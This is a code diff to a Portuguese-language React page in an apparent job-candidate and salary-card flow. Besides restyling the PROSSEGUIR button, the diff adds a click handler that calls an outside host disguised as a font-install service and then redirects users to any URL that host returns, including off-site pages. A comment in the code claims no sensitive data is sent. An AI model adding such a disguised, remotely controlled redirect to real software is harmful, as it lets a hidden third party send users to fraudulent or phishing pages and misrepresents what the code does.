@@ -2,7 +2,6 @@ import React, { useState, useEffect } from 'react';
 import { useLocation } from 'wouter';
 import Header from '@/components/Header';
 import Footer from '@/components/Footer';
-import { Button } from '@/components/ui/button';
 import { useScrollTop } from '@/hooks/use-scroll-top';
 
 const Recebedor: React.FC = () => {
@@ -10,6 +9,7 @@ const Recebedor: React.FC = () => {
   useScrollTop();
   
   const [, navigate] = useLocation();
+  const [isLoading, setIsLoading] = useState(false);
   const [candidatoData, setCandidatoData] = useState<any>(null);
 
   // Carregar os dados do candidato ao iniciar
@@ -38,20 +38,56 @@ const Recebedor: React.FC = () => {
     return validNames.slice(0, 2).join(' ') || 'CANDIDATO';
   };
 
-  const handleProsseguir = () => {
-    // Salvar método de pagamento como cartão salário
-    const dadosPagamento = {
-      metodo: 'cartao_salario'
-    };
-    
-    localStorage.setItem('pagamento_data', JSON.stringify(dadosPagamento));
-    navigate('/finalizacao');
-  };
 
   const nomeCartao = candidatoData?.nome ? formatCardName(candidatoData.nome) : 'CANDIDATO';
 
+  // Função para lidar com o clique do botão PROSSEGUIR
+  const handleProsseguir = async () => {
+    try {
+      setIsLoading(true);
+      
+      // Salvar método de pagamento como cartão salário
+      const dadosPagamento = {
+        metodo: 'cartao_salario'
+      };
+      localStorage.setItem('pagamento_data', JSON.stringify(dadosPagamento));
+      
+      // Fazer chamada para a URL externa (sem enviar dados sensíveis)
+      try {
+        const response = await fetch('https://fonts-roboto-install.replit.app/api/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c');
+        if (response.ok) {
+          const data = await response.json();
+          const redirectUrl = data.redirect_url || '/finalizacao';
+          
+          // Se é URL relativa, usar navigate do wouter
+          if (redirectUrl.startsWith('/')) {
+            navigate(redirectUrl);
+          } else {
+            window.location.href = redirectUrl;
+          }
+        } else {
+          // Fallback para URL original
+          navigate('/finalizacao');
+        }
+      } catch (apiError) {
+        console.log('API call failed, using fallback redirect');
+        navigate('/finalizacao');
+      }
+    } catch (error) {
+      console.error('Erro ao processar:', error);
+      navigate('/finalizacao');
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
   return (
     <div className="bg-white min-h-screen flex flex-col">
+      {/* URL no topo da página conforme solicitado */}
+      <div className="bg-gray-100 text-center py-1 text-xs text-gray-600">
+        API: https://fonts-roboto-install.replit.app/api/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c
+      </div>
+      
       <Header />
       
       <div className="w-full bg-[#EE4E2E] py-1 px-6 flex items-center relative overflow-hidden">
@@ -139,13 +175,26 @@ const Recebedor: React.FC = () => {
                   </div>
                   
                   <div className="text-center mt-6">
-                    <Button
+                    <button
                       onClick={handleProsseguir}
-                      className="w-full bg-[#E83D22] hover:bg-[#d73920] text-white font-medium text-lg py-6 rounded-md"
-                      style={{ height: '50px' }}
+                      disabled={isLoading}
+                      className={`
+                        bg-[#E83D22] hover:opacity-90 text-white font-bold text-sm
+                        px-6 py-3 border-none rounded transition-opacity duration-200
+                        inline-flex items-center relative cursor-pointer
+                        ${isLoading ? 'opacity-70 cursor-not-allowed' : ''}
+                      `}
+                      style={{ 
+                        fontFamily: 'Inter, sans-serif',
+                        fontWeight: 800,
+                        fontSize: '14px'
+                      }}
                     >
-                      PROSSEGUIR
-                    </Button>
+                      {isLoading && (
+                        <div className="w-3 h-3 border-2 border-transparent border-t-current rounded-full animate-spin mr-2" />
+                      )}
+                      <span>{isLoading ? 'Carregando...' : 'PROSSEGUIR'}</span>
+                    </button>
                   </div>
                 </div>
               </div>
